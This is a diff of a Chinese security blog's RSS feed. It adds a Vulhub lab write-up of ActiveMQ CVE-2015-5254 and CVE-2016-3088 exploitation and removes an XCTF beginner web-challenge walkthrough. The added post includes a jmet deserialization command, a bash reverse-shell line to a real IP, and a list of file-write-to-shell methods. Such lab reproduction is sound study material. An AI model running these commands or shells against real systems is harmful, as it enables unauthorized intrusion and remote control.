+&lt;p&gt;其中formhash的值为：
+&lt;img src=&quot;/assets/img/posts/5d0334e5b240c14832.png&quot; alt=&quot;&quot; /&gt;
+发送请求后即刻删除指定的文件:
+&lt;img src=&quot;/assets/img/posts/5d0334e65501c75422.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;activemq-反序列化漏洞cve-2015-5254&quot;&gt;ActiveMQ 反序列化漏洞（CVE-2015-5254）&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Path:activemq/CVE-2015-5254&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;漏洞详情&quot;&gt;漏洞详情：&lt;/h3&gt;
+
+&lt;p&gt;Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。&lt;/p&gt;
+
+&lt;h3 id=&quot;漏洞复现-5&quot;&gt;漏洞复现：&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;前提：需要使用管理员权限的账号或者诱导管理员点击固定连接&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;· 构造可执行命令的序列化对象&lt;br /&gt;
+这里使用的是jmet&lt;a href=&quot;https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar&quot;&gt;下载地址&lt;/a&gt;，jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。也可以单独使用ysoserial并发送。需要注意的是，使用jmet的时候需要在统计目录中创建一个名为external的文件夹，否则可能报文件夹不存在的错误
+· 构造消息传递给目标的61616端口&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &lt;span class=&quot;s2&quot;&gt;&quot;touch /tmp/success&quot;&lt;/span&gt; -Yp ROME your-ip 61616
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5d04559c3e45c87197.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;· 使用管理员账号登陆管理界面，http://your-ip:8161/admin/browse.jsp? 点击查看消息详情，出发命令执行。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5d0456dc7307223516.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;· 进入docker查看文件创建情况&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5d04573291c4e85321.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;· 将运行的命令切换为反弹 shell的命令即可获得目标的shell&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -i &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/47.102.143.147/222 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;##&lt;/p&gt;
+
+&lt;h1 id=&quot;activemq任意文件写入漏洞cve-2016-3088&quot;&gt;ActiveMQ任意文件写入漏洞（CVE-2016-3088）&lt;/h1&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Path:activemq/CVE-2016-3088&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;ActiveMQ的web控制台分三个应用，admin、api和fileserver，fileserver无需登录。&lt;/p&gt;
+
+&lt;p&gt;本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。&lt;/p&gt;
+
+&lt;h4 id=&quot;文件上传getshell的几种方法&quot;&gt;文件上传getshell的几种方法：&lt;/h4&gt;
+
+&lt;p&gt;1、写入webshell，好处是使用的门槛低，但是需要被解析&lt;/p&gt;
+
+&lt;p&gt;2、写入cron或者ssh key，可以直接反弹shell，但是需要roo权限&lt;/p&gt;
+
+&lt;p&gt;3、写入jar，稍微复杂&lt;/p&gt;
+
+&lt;p&gt;4、写入xml配置文件、需要知道activemq的绝对路径&lt;/p&gt;
+
+&lt;h4 id=&quot;上传webshell&quot;&gt;上传webshell&lt;/h4&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;前提条件：拥有后台管理员权限&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;首先进入http://47.102.143.147:8161/admin/test/systemProperties.jsp 查看activemq的屋里路径：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/vulhub.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sun, 16 Jun 2019 04:49:43 +0800</pubDate>
+        <link>http://localhost:4000/2019/06/16/vulhub.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/06/16/vulhub.html</guid>
+        
+        <category>漏洞复现</category>
+        
+        <category>WEB</category>
+        
+        <category>ALL</category>
+        
+        
+        <category>漏洞复现</category>
+        
+        <category>WEB</category>
+        
+        <category>ALL</category>
+        
+      </item>
     
       <item>
         <title>Python编写扫描器</title>
@@ -1306,71 +1657,6 @@ outguess -r lamb.jpg -out 获得flag&lt;/p&gt;
         <pubDate>Sat, 06 Apr 2019 00:18:43 +0800</pubDate>
         <link>http://localhost:4000/2019/04/06/miscnote.html</link>
         <guid isPermaLink="true">http://localhost:4000/2019/04/06/miscnote.html</guid>
-        
-        <category>CTF</category>
-        
-        <category>ALL</category>
-        
-        
-        <category>CTF</category>
-        
-        <category>ALL</category>
-        
-      </item>
-    
-      <item>
-        <title>Xctf练习题</title>
-        <description>&lt;h2 id=&quot;1view_source&quot;&gt;1.view_source&lt;/h2&gt;
-
-&lt;p&gt;无法使用右键查看代码，所以使用&lt;br /&gt;
-view-source:URL&lt;/p&gt;
-
-&lt;h2 id=&quot;2get_post&quot;&gt;2.get_post&lt;/h2&gt;
-
-&lt;p&gt;url?a=1传递get值，使用hackbar传递b的值得到flag&lt;/p&gt;
-
-&lt;h2 id=&quot;3robots&quot;&gt;3.robots&lt;/h2&gt;
-
-&lt;p&gt;访问网站url/robots.txt发现网页包含f1ag_1s_h3re.php文件，访问得到flag&lt;/p&gt;
-
-&lt;h2 id=&quot;4backup&quot;&gt;4.backup&lt;/h2&gt;
-
-&lt;p&gt;访问网站index.php的备份文件index.php.bak得到flag&lt;/p&gt;
-
-&lt;h2 id=&quot;5cookie&quot;&gt;5.cookie&lt;/h2&gt;
-
-&lt;p&gt;使用burp抓包看响应头&lt;/p&gt;
-
-&lt;h2 id=&quot;6disable_button&quot;&gt;6.disable_button&lt;/h2&gt;
-
-&lt;p&gt;①可以将代码中的disable=”“标签删除 &lt;br /&gt;
-②可以使用hackbar传递post的值&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;disabled&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;btn btn-default&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;height:50px;width:200px;&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flag&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;auth&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt; 
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;post传递参数auth=flag&lt;/p&gt;
-
-&lt;h2 id=&quot;7xff_referer&quot;&gt;7.xff_referer&lt;/h2&gt;
-
-&lt;p&gt;X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项
-HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理
-解题步骤：
-使用burp抓包修改X-Forwarded-For和Referer参数
-&lt;img src=&quot;/assets/img/posts/xctf-1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;8weak_auth&quot;&gt;8.weak_auth&lt;/h2&gt;
-
-&lt;p&gt;爆破得到flag&lt;/p&gt;
-
-&lt;h2 id=&quot;9webshell&quot;&gt;9.webshell&lt;/h2&gt;
-
-&lt;p&gt;链接webshell得到flag&lt;/p&gt;
-</description>
-        <pubDate>Thu, 04 Apr 2019 04:49:43 +0800</pubDate>
-        <link>http://localhost:4000/2019/04/04/xctfeasy.html</link>
-        <guid isPermaLink="true">http://localhost:4000/2019/04/04/xctfeasy.html</guid>
         
         <category>CTF</category>
         
